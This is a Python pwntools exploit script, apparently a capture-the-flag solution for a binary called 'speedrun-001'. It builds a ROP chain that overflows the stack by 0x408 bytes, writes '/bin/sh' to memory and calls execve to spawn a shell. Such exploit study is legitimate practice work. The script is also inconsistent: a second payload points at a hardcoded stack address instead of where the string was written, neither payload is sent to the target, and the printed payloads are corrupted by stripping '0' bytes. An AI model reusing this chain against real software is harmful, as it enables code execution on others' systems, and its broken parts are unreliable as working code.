from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = b''
rop += popRdx
rop += b"/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload1 = b"0"*0x408 + rop


def b(i):
    return i.to_bytes(8,"little")



offset = 1032

pop_rax = 0x0000000000415664
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004101f3
pop_rdx = 0x00000000004498b5

syscall = 0x000000000040129c

injec_addr = 0x7fffffffdd80
shell = 0x0068732f6e69622f

payload = b"0" * 0x408
# payload += b(shell)
# payload += b"/bin/sh\x00"
# payload += b"A" * (offset - len(payload))

payload += b(pop_rdx)
payload += b"/bin/sh\x00"
payload += b(pop_rax)
payload += b(0x6b6000)
payload += b(0x48d251)

payload += b(pop_rax)
payload += b(0x3b)
payload += b(pop_rdi)
payload += b(injec_addr)
payload += b(pop_rsi)
payload += b(0x0)
payload += b(pop_rdx)
payload += b(0x0)

payload += b(syscall)

print(payload1.replace(b"0", b""))
print(payload.replace(b"0", b""))
